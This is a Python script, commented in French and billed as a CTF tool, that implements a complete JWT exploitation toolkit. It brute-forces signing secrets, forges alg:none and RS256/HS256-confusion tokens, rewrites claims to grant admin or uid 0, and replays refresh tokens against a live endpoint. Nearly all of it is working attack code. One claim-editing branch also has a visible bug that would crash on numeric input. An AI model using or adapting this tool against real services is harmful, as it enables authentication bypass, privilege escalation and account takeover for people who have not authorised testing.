#!/usr/bin/env python3
"""
JWT Exploitation Tool by H8Laws
Outil complet pour exploiter les vulnérabilités JWT en CTF
"""

import base64
import hashlib
import hmac
import json
import sys
import time
import re
from datetime import datetime, timedelta
import requests
from typing import Optional, Dict, List
import threading
from pathlib import Path

# === Couleurs ===
RED = "\033[1;31m"
GREEN = "\033[1;32m"
YELLOW = "\033[1;33m"
BLUE = "\033[1;34m"
CYAN = "\033[1;36m"
MAGENTA = "\033[1;35m"
RESET = "\033[0m"

# === Banner ===
def banner():
    print(RED + r"""
     ██╗██╗    ██╗████████╗    ██╗  ██╗ █████╗  ██████╗██╗  ██╗
     ██║██║    ██║╚══██╔══╝    ██║  ██║██╔══██╗██╔════╝██║ ██╔╝
     ██║██║ █╗ ██║   ██║       ███████║███████║██║     █████╔╝ 
██   ██║██║███╗██║   ██║       ██╔══██║██╔══██║██║     ██╔═██╗ 
╚█████╔╝╚███╔███╔╝   ██║       ██║  ██║██║  ██║╚██████╗██║  ██╗
 ╚════╝  ╚══╝╚══╝    ╚═╝       ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝
""" + RESET)
    print(f"{CYAN}          JWT Exploitation Tool - CTF Edition by H8Laws{RESET}")
    print(f"{YELLOW}          Brute Force | Alg None | RS256/HS256 | Token Abuse{RESET}\n")

# === Fonctions utilitaires JWT ===
def base64url_decode(data: str) -> bytes:
    """Décode du base64url"""
    # Ajouter le padding manquant
    padding = 4 - (len(data) % 4)
    if padding != 4:
        data += '=' * padding
    # Remplacer les caractères URL-safe
    data = data.replace('-', '+').replace('_', '/')
    return base64.b64decode(data)

def base64url_encode(data: bytes) -> str:
    """Encode en base64url"""
    encoded = base64.b64encode(data).decode('utf-8')
    # Supprimer le padding et remplacer les caractères
    return encoded.rstrip('=').replace('+', '-').replace('/', '_')

def parse_jwt(token: str) -> Optional[Dict]:
    """Parse un JWT et retourne header, payload, signature"""
    try:
        parts = token.split('.')
        if len(parts) != 3:
            print(f"{RED}[-] JWT invalide : doit avoir 3 parties séparées par des points{RESET}")
            return None
        
        header = json.loads(base64url_decode(parts[0]))
        payload = json.loads(base64url_decode(parts[1]))
        signature = parts[2]
        
        return {
            'header': header,
            'payload': payload,
            'signature': signature,
            'raw_parts': parts
        }
    except Exception as e:
        print(f"{RED}[-] Erreur lors du parsing du JWT : {e}{RESET}")
        return None

def display_jwt_info(parsed: Dict):
    """Affiche les informations du JWT de manière formatée"""
    print(f"\n{BLUE}{'='*70}{RESET}")
    print(f"{CYAN}📋 JWT Information{RESET}")
    print(f"{BLUE}{'='*70}{RESET}\n")
    
    print(f"{GREEN}[Header]{RESET}")
    print(json.dumps(parsed['header'], indent=2))
    
    print(f"\n{GREEN}[Payload]{RESET}")
    print(json.dumps(parsed['payload'], indent=2))
    
    print(f"\n{GREEN}[Signature]{RESET}")
    print(f"{parsed['signature'][:50]}..." if len(parsed['signature']) > 50 else parsed['signature'])
    
    # Informations utiles
    if 'exp' in parsed['payload']:
        exp_timestamp = parsed['payload']['exp']
        exp_date = datetime.fromtimestamp(exp_timestamp)
        now = datetime.now()
        
        print(f"\n{YELLOW}⏰ Expiration : {exp_date.strftime('%Y-%m-%d %H:%M:%S')}{RESET}")
        if exp_date < now:
            print(f"{RED}   ⚠️  Token expiré !{RESET}")
        else:
            remaining = exp_date - now
            print(f"{GREEN}   ✓ Valide encore {remaining.seconds // 3600}h {(remaining.seconds % 3600) // 60}m{RESET}")
    
    print(f"{BLUE}{'='*70}{RESET}\n")

def create_jwt(header: Dict, payload: Dict, secret: str = "") -> str:
    """Crée un JWT à partir du header et payload"""
    # Encoder header et payload
    header_encoded = base64url_encode(json.dumps(header, separators=(',', ':')).encode())
    payload_encoded = base64url_encode(json.dumps(payload, separators=(',', ':')).encode())
    
    # Créer la signature
    message = f"{header_encoded}.{payload_encoded}"
    
    if header.get('alg', '').upper() == 'NONE':
        # Pas de signature pour alg:none
        signature = ""
    elif secret:
        # HMAC signature
        alg = header.get('alg', 'HS256')
        if alg == 'HS256':
            signature = base64url_encode(
                hmac.new(secret.encode(), message.encode(), hashlib.sha256).digest()
            )
        elif alg == 'HS512':
            signature = base64url_encode(
                hmac.new(secret.encode(), message.encode(), hashlib.sha512).digest()
            )
        else:
            print(f"{YELLOW}[!] Algorithme {alg} non supporté pour la signature automatique{RESET}")
            signature = ""
    else:
        signature = ""
    
    return f"{message}.{signature}"

# === 1. Brute Force de secret faible ===
def brute_force_secret(token: str, wordlist_path: str = None):
    """Brute force du secret JWT avec une wordlist"""
    print(f"\n{CYAN}[*] Lancement du brute force de secret JWT...{RESET}\n")
    
    parsed = parse_jwt(token)
    if not parsed:
        return
    
    alg = parsed['header'].get('alg', 'HS256').upper()
    if alg not in ['HS256', 'HS512', 'HS384']:
        print(f"{RED}[-] L'algorithme {alg} n'est pas supporté pour le brute force{RESET}")
        return
    
    # Wordlist par défaut
    if not wordlist_path:
        print(f"{YELLOW}[*] Utilisation de la wordlist par défaut{RESET}")
        common_secrets = [
            'secret', 'password', 'admin', '123456', 'qwerty',
            'your-256-bit-secret', 'your-secret-key', 'mysecretkey',
            'jwt-secret', 'secretkey', 'key', 'changeme', 'password123',
            'admin123', 'root', 'toor', 'test', 'demo', 'secret123',
            '', ' ', 'null', 'undefined', 'bearer', 'token'
        ]
        wordlist = common_secrets
    else:
        try:
            with open(wordlist_path, 'r', encoding='utf-8', errors='ignore') as f:
                wordlist = [line.strip() for line in f if line.strip()]
            print(f"{GREEN}[+] Wordlist chargée : {len(wordlist)} entrées{RESET}")
        except Exception as e:
            print(f"{RED}[-] Erreur lors de la lecture de la wordlist : {e}{RESET}")
            return
    
    # Message à signer
    message = f"{parsed['raw_parts'][0]}.{parsed['raw_parts'][1]}"
    target_signature = parsed['signature']
    
    # Choisir la fonction de hash
    hash_func = {
        'HS256': hashlib.sha256,
        'HS384': hashlib.sha384,
        'HS512': hashlib.sha512
    }.get(alg, hashlib.sha256)
    
    print(f"{CYAN}[*] Tentative de {len(wordlist)} secrets...{RESET}\n")
    
    start_time = time.time()
    attempts = 0
    
    for secret in wordlist:
        attempts += 1
        
        # Calculer la signature
        signature = base64url_encode(
            hmac.new(secret.encode(), message.encode(), hash_func).digest()
        )
        
        if signature == target_signature:
            elapsed = time.time() - start_time
            print(f"\n{GREEN}{'='*70}{RESET}")
            print(f"{GREEN}[✓] SECRET TROUVÉ !{RESET}")
            print(f"{GREEN}{'='*70}{RESET}")
            print(f"{YELLOW}Secret : {CYAN}{secret}{RESET}")
            print(f"{YELLOW}Temps : {CYAN}{elapsed:.2f}s{RESET}")
            print(f"{YELLOW}Tentatives : {CYAN}{attempts}{RESET}")
            print(f"{GREEN}{'='*70}{RESET}\n")
            return secret
        
        # Afficher la progression
        if attempts % 100 == 0:
            print(f"{YELLOW}[*] Testé {attempts}/{len(wordlist)} secrets...{RESET}", end='\r')
    
    elapsed = time.time() - start_time
    print(f"\n{RED}[-] Secret non trouvé après {attempts} tentatives ({elapsed:.2f}s){RESET}\n")
    return None

# === 2. Test alg:none ===
def test_alg_none(token: str):
    """Teste la vulnérabilité alg:none"""
    print(f"\n{CYAN}[*] Test de la vulnérabilité alg:none...{RESET}\n")
    
    parsed = parse_jwt(token)
    if not parsed:
        return
    
    # Créer des variantes avec alg:none
    variants = []
    
    # Variante 1: alg = "none" (minuscule)
    header1 = parsed['header'].copy()
    header1['alg'] = 'none'
    token1 = create_jwt(header1, parsed['payload'])
    variants.append(('none (minuscule)', token1))
    
    # Variante 2: alg = "None" (capitalisé)
    header2 = parsed['header'].copy()
    header2['alg'] = 'None'
    token2 = create_jwt(header2, parsed['payload'])
    variants.append(('None (capitalisé)', token2))
    
    # Variante 3: alg = "NONE" (majuscule)
    header3 = parsed['header'].copy()
    header3['alg'] = 'NONE'
    token3 = create_jwt(header3, parsed['payload'])
    variants.append(('NONE (majuscule)', token3))
    
    # Variante 4: Sans signature mais avec point final
    header4 = parsed['header'].copy()
    header4['alg'] = 'none'
    token4 = create_jwt(header4, parsed['payload']) + '.'
    variants.append(('none avec point final', token4))
    
    print(f"{GREEN}[+] {len(variants)} variantes générées :{RESET}\n")
    
    for i, (desc, variant_token) in enumerate(variants, 1):
        print(f"{YELLOW}Variante {i} ({desc}):{RESET}")
        print(f"{CYAN}{variant_token}{RESET}\n")
    
    return variants

# === 3. Confusion RS256/HS256 ===
def test_rs256_to_hs256(token: str, public_key_path: str = None):
    """Teste la confusion d'algorithme RS256 -> HS256"""
    print(f"\n{CYAN}[*] Test de confusion RS256 -> HS256...{RESET}\n")
    
    parsed = parse_jwt(token)
    if not parsed:
        return
    
    alg = parsed['header'].get('alg', '').upper()
    if alg != 'RS256':
        print(f"{YELLOW}[!] Le token utilise l'algorithme {alg}, pas RS256{RESET}")
        print(f"{YELLOW}[!] Cette attaque fonctionne quand le serveur attend RS256{RESET}")
    
    if not public_key_path:
        print(f"{YELLOW}[!] Clé publique non fournie{RESET}")
        print(f"{CYAN}[*] Exemple d'utilisation :{RESET}")
        print(f"    1. Récupérer la clé publique du serveur (souvent /.well-known/jwks.json)")
        print(f"    2. Convertir en PEM si nécessaire")
        print(f"    3. Relancer avec --pubkey chemin/vers/public.pem")
        print(f"\n{CYAN}[*] Génération d'un token HS256 générique :{RESET}\n")
        
        # Créer une version HS256 avec un secret faible
        header_hs256 = parsed['header'].copy()
        header_hs256['alg'] = 'HS256'
        
        common_keys = ['public_key', 'public', 'key', '-----BEGIN PUBLIC KEY-----']
        
        print(f"{GREEN}Tokens HS256 avec secrets communs :{RESET}\n")
        for secret in common_keys:
            token_hs256 = create_jwt(header_hs256, parsed['payload'], secret)
            print(f"{YELLOW}Secret: {secret}{RESET}")
            print(f"{CYAN}{token_hs256}{RESET}\n")
        
        return None
    
    try:
        with open(public_key_path, 'r') as f:
            public_key = f.read().strip()
        
        print(f"{GREEN}[+] Clé publique chargée{RESET}\n")
        
        # Créer un token HS256 en utilisant la clé publique comme secret
        header_hs256 = parsed['header'].copy()
        header_hs256['alg'] = 'HS256'
        
        token_hs256 = create_jwt(header_hs256, parsed['payload'], public_key)
        
        print(f"{GREEN}[✓] Token HS256 généré avec la clé publique comme secret :{RESET}\n")
        print(f"{CYAN}{token_hs256}{RESET}\n")
        
        return token_hs256
        
    except Exception as e:
        print(f"{RED}[-] Erreur : {e}{RESET}")
        return None

# === 4. Modification de claims ===
def modify_claims(token: str):
    """Interface pour modifier les claims du JWT"""
    print(f"\n{CYAN}[*] Modification des claims JWT...{RESET}\n")
    
    parsed = parse_jwt(token)
    if not parsed:
        return
    
    display_jwt_info(parsed)
    
    print(f"{YELLOW}[?] Que voulez-vous modifier ?{RESET}\n")
    print(f"  1. Modifier un claim existant")
    print(f"  2. Ajouter un nouveau claim")
    print(f"  3. Supprimer un claim")
    print(f"  4. Modifications rapides (admin, role, etc.)")
    print(f"  5. Changer l'expiration")
    print(f"  0. Retour")
    
    choice = input(f"\n{CYAN}[?] Choix : {RESET}").strip()
    
    new_payload = parsed['payload'].copy()
    
    if choice == '1':
        key = input(f"{CYAN}[?] Nom du claim à modifier : {RESET}").strip()
        if key in new_payload:
            print(f"{YELLOW}Valeur actuelle : {new_payload[key]}{RESET}")
            value = input(f"{CYAN}[?] Nouvelle valeur : {RESET}").strip()
            
            # Tenter de convertir en nombre si possible
            try:
                if '.' in value:
                    value = float(value)
                else:
                    value = int(value)
            except:
                pass
            
            # Convertir les booléens
            if value.lower() in ['true', 'false']:
                value = value.lower() == 'true'
            
            new_payload[key] = value
        else:
            print(f"{RED}[-] Claim '{key}' non trouvé{RESET}")
            return
    
    elif choice == '2':
        key = input(f"{CYAN}[?] Nom du nouveau claim : {RESET}").strip()
        value = input(f"{CYAN}[?] Valeur : {RESET}").strip()
        
        try:
            if '.' in value:
                value = float(value)
            else:
                value = int(value)
        except:
            pass
        
        if value.lower() in ['true', 'false']:
            value = value.lower() == 'true'
        
        new_payload[key] = value
    
    elif choice == '3':
        key = input(f"{CYAN}[?] Nom du claim à supprimer : {RESET}").strip()
        if key in new_payload:
            del new_payload[key]
        else:
            print(f"{RED}[-] Claim '{key}' non trouvé{RESET}")
            return
    
    elif choice == '4':
        print(f"\n{YELLOW}Modifications rapides :{RESET}\n")
        print(f"  1. is_admin = true")
        print(f"  2. role = admin")
        print(f"  3. user = admin")
        print(f"  4. username = admin")
        print(f"  5. email = admin@localhost")
        print(f"  6. uid = 0")
        
        quick = input(f"\n{CYAN}[?] Choix : {RESET}").strip()
        
        quick_mods = {
            '1': {'is_admin': True},
            '2': {'role': 'admin'},
            '3': {'user': 'admin'},
            '4': {'username': 'admin'},
            '5': {'email': 'admin@localhost'},
            '6': {'uid': 0}
        }
        
        if quick in quick_mods:
            new_payload.update(quick_mods[quick])
        else:
            print(f"{RED}[-] Choix invalide{RESET}")
            return
    
    elif choice == '5':
        hours = input(f"{CYAN}[?] Expiration dans combien d'heures ? (défaut: 24) : {RESET}").strip()
        try:
            hours = int(hours) if hours else 24
        except:
            hours = 24
        
        exp_time = datetime.now() + timedelta(hours=hours)
        new_payload['exp'] = int(exp_time.timestamp())
        print(f"{GREEN}[+] Expiration réglée sur : {exp_time.strftime('%Y-%m-%d %H:%M:%S')}{RESET}")
    
    else:
        return
    
    # Générer le nouveau token
    print(f"\n{YELLOW}[*] Nouveau payload :{RESET}")
    print(json.dumps(new_payload, indent=2))
    
    print(f"\n{YELLOW}[?] Voulez-vous signer le token ?{RESET}")
    print(f"  1. Pas de signature (alg:none)")
    print(f"  2. Avec un secret (HS256)")
    print(f"  3. Garder la signature originale (ne fonctionnera probablement pas)")
    
    sign_choice = input(f"\n{CYAN}[?] Choix : {RESET}").strip()
    
    if sign_choice == '1':
        header = parsed['header'].copy()
        header['alg'] = 'none'
        new_token = create_jwt(header, new_payload)
    elif sign_choice == '2':
        secret = input(f"{CYAN}[?] Secret HMAC : {RESET}").strip()
        new_token = create_jwt(parsed['header'], new_payload, secret)
    else:
        # Garder l'ancienne signature (ne fonctionnera pas mais utile pour tester)
        header_encoded = base64url_encode(json.dumps(parsed['header'], separators=(',', ':')).encode())
        payload_encoded = base64url_encode(json.dumps(new_payload, separators=(',', ':')).encode())
        new_token = f"{header_encoded}.{payload_encoded}.{parsed['signature']}"
    
    print(f"\n{GREEN}[✓] Nouveau token généré :{RESET}\n")
    print(f"{CYAN}{new_token}{RESET}\n")
    
    return new_token

# === 5. Refresh Token Abuse ===
def refresh_token_abuse(refresh_token: str, endpoint: str = None):
    """Teste l'abus de refresh tokens"""
    print(f"\n{CYAN}[*] Test d'abus de refresh token...{RESET}\n")
    
    # Parser le refresh token s'il ressemble à un JWT
    if refresh_token.count('.') == 2:
        parsed = parse_jwt(refresh_token)
        if parsed:
            display_jwt_info(parsed)
    
    if not endpoint:
        print(f"{YELLOW}[!] Endpoint non fourni{RESET}\n")
        print(f"{CYAN}[*] Attaques courantes sur les refresh tokens :{RESET}\n")
        print(f"  1. {YELLOW}Réutilisation multiple{RESET} - Tenter d'utiliser le même refresh token plusieurs fois")
        print(f"  2. {YELLOW}Token volé{RESET} - Utiliser un refresh token d'un autre utilisateur")
        print(f"  3. {YELLOW}Pas d'expiration{RESET} - Vérifier si le token n'expire jamais")
        print(f"  4. {YELLOW}Pas de révocation{RESET} - Vérifier si le token fonctionne après logout")
        print(f"  5. {YELLOW}Modification du user_id{RESET} - Modifier l'ID utilisateur dans le refresh token")
        
        print(f"\n{CYAN}[*] Checklist manuelle :{RESET}\n")
        checklist = [
            "☐ Le refresh token peut-il être réutilisé plusieurs fois ?",
            "☐ Le refresh token expire-t-il ?",
            "☐ Le refresh token est-il révoqué après déconnexion ?",
            "☐ Peut-on deviner/bruteforcer les refresh tokens ?",
            "☐ Les refresh tokens sont-ils liés à une session/IP ?",
            "☐ Peut-on échanger un refresh token contre plusieurs access tokens ?",
        ]
        
        for item in checklist:
            print(f"  {item}")
        
        return
    
    # Test automatique si endpoint fourni
    print(f"{CYAN}[*] Test de réutilisation du refresh token...{RESET}\n")
    
    for i in range(5):
        try:
            print(f"{YELLOW}[*] Tentative {i+1}/5...{RESET}")
            
            response = requests.post(
                endpoint,
                json={'refresh_token': refresh_token},
                timeout=5
            )
            
            print(f"{GREEN}[+] Status: {response.status_code}{RESET}")
            
            if response.status_code == 200:
                print(f"{GREEN}[✓] Refresh token accepté !{RESET}")
                try:
                    data = response.json()
                    if 'access_token' in data:
                        print(f"{CYAN}Access token obtenu : {data['access_token'][:50]}...{RESET}")
                except:
                    pass
            else:
                print(f"{RED}[-] Refresh token refusé{RESET}")
                break
            
            time.sleep(1)
            
        except Exception as e:
            print(f"{RED}[-] Erreur : {e}{RESET}")
            break
    
    print()

# === 6. Analyse complète ===
def full_analysis(token: str):
    """Effectue une analyse complète du JWT"""
    print(f"\n{CYAN}[*] Analyse complète du JWT...{RESET}\n")
    
    parsed = parse_jwt(token)
    if not parsed:
        return
    
    display_jwt_info(parsed)
    
    # Vérifications de sécurité
    print(f"{YELLOW}🔍 Analyse de sécurité :{RESET}\n")
    
    issues = []
    
    # Vérifier l'algorithme
    alg = parsed['header'].get('alg', '').upper()
    if alg == 'NONE':
        issues.append(f"{RED}[!] CRITIQUE : Algorithme 'none' utilisé (pas de signature){RESET}")
    elif alg in ['HS256', 'HS512']:
        issues.append(f"{YELLOW}[!] Algorithme symétrique ({alg}) - Vulnérable au brute force{RESET}")
    elif alg in ['RS256', 'RS512']:
        issues.append(f"{GREEN}[✓] Algorithme asymétrique ({alg}) - Plus sécurisé{RESET}")
        issues.append(f"{YELLOW}[!] Vérifier la confusion RS256/HS256{RESET}")
    
    # Vérifier l'expiration
    if 'exp' not in parsed['payload']:
        issues.append(f"{RED}[!] CRITIQUE : Pas d'expiration (exp) définie{RESET}")
    else:
        exp_date = datetime.fromtimestamp(parsed['payload']['exp'])
        now = datetime.now()
        if exp_date < now:
            issues.append(f"{RED}[!] Token expiré{RESET}")
        else:
            delta = exp_date - now
            if delta.days > 365:
                issues.append(f"{YELLOW}[!] Expiration très longue ({delta.days} jours){RESET}")
    
    # Vérifier les claims sensibles
    sensitive_claims = ['is_admin', 'admin', 'role', 'permissions', 'scope']
    for claim in sensitive_claims:
        if claim in parsed['payload']:
            value = parsed['payload'][claim]
            issues.append(f"{YELLOW}[!] Claim sensible trouvé : {claim} = {value}{RESET}")
    
    # Vérifier la taille
    if len(token) < 100:
        issues.append(f"{YELLOW}[!] Token très court - Secret potentiellement faible{RESET}")
    
    # Afficher les résultats
    for issue in issues:
        print(f"  {issue}")
    
    # Recommandations d'attaque
    print(f"\n{CYAN}💡 Recommandations d'attaque :{RESET}\n")
    
    if alg in ['HS256', 'HS512', 'HS384']:
        print(f"  {GREEN}→{RESET} Lancer un brute force du secret")
    
    if alg != 'NONE':
        print(f"  {GREEN}→{RESET} Tester la vulnérabilité alg:none")
    
    if alg in ['RS256', 'RS512']:
        print(f"  {GREEN}→{RESET} Tester la confusion RS256/HS256")
    
    if 'is_admin' in parsed['payload'] or 'role' in parsed['payload']:
        print(f"  {GREEN}→{RESET} Modifier les claims pour obtenir des privilèges")
    
    print()

# === Menu principal ===
def main():
    banner()
    
    print(f"{CYAN}[?] JWT Token à analyser :{RESET}")
    token = input(f"{GREEN}> {RESET}").strip()
    
    if not token:
        print(f"{RED}[-] Token requis !{RESET}")
        return
    
    while True:
        print(f"\n{BLUE}{'='*70}{RESET}")
        print(f"{CYAN}🎯 JWT EXPLOITATION MENU{RESET}")
        print(f"{BLUE}{'='*70}{RESET}\n")
        print(f"  {YELLOW}1.{RESET} 🔍 Analyser le JWT")
        print(f"  {YELLOW}2.{RESET} 💥 Brute Force du secret")
        print(f"  {YELLOW}3.{RESET} 🚫 Test alg:none")
        print(f"  {YELLOW}4.{RESET} 🔄 Confusion RS256/HS256")
        print(f"  {YELLOW}5.{RESET} ✏️  Modifier les claims")
        print(f"  {YELLOW}6.{RESET} 🔁 Refresh Token Abuse")
        print(f"  {YELLOW}7.{RESET} 🔬 Analyse complète")
        print(f"  {YELLOW}8.{RESET} 🔄 Changer de token")
        print(f"  {YELLOW}0.{RESET} ❌ Quitter")
        
        choice = input(f"\n{CYAN}[?] Choix : {RESET}").strip()
        
        if choice == '1':
            parsed = parse_jwt(token)
            if parsed:
                display_jwt_info(parsed)
        
        elif choice == '2':
            wordlist = input(f"{CYAN}[?] Chemin de la wordlist (Entrée pour wordlist par défaut) : {RESET}").strip()
            brute_force_secret(token, wordlist if wordlist else None)
        
        elif choice == '3':
            test_alg_none(token)
        
        elif choice == '4':
            pubkey = input(f"{CYAN}[?] Chemin de la clé publique (Entrée pour générique) : {RESET}").strip()
            test_rs256_to_hs256(token, pubkey if pubkey else None)
        
        elif choice == '5':
            new_token = modify_claims(token)
            if new_token:
                use_new = input(f"{CYAN}[?] Utiliser ce nouveau token pour la suite ? (y/N) : {RESET}").strip().lower()
                if use_new == 'y':
                    token = new_token
        
        elif choice == '6':
            refresh_token = input(f"{CYAN}[?] Refresh token (Entrée pour utiliser le token actuel) : {RESET}").strip()
            endpoint = input(f"{CYAN}[?] Endpoint de refresh (optionnel) : {RESET}").strip()
            refresh_token_abuse(refresh_token if refresh_token else token, endpoint if endpoint else None)
        
        elif choice == '7':
            full_analysis(token)
        
        elif choice == '8':
            print(f"{CYAN}[?] Nouveau JWT Token :{RESET}")
            new_token = input(f"{GREEN}> {RESET}").strip()
            if new_token:
                token = new_token
                print(f"{GREEN}[+] Token mis à jour !{RESET}")
        
        elif choice == '0':
            print(f"\n{GREEN}[+] Au revoir !{RESET}\n")
            break
        
        else:
            print(f"{RED}[-] Choix invalide !{RESET}")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n\n{YELLOW}[!] Interruption détectée{RESET}")
        print(f"{GREEN}[+] Au revoir !{RESET}\n")
        sys.exit(0)
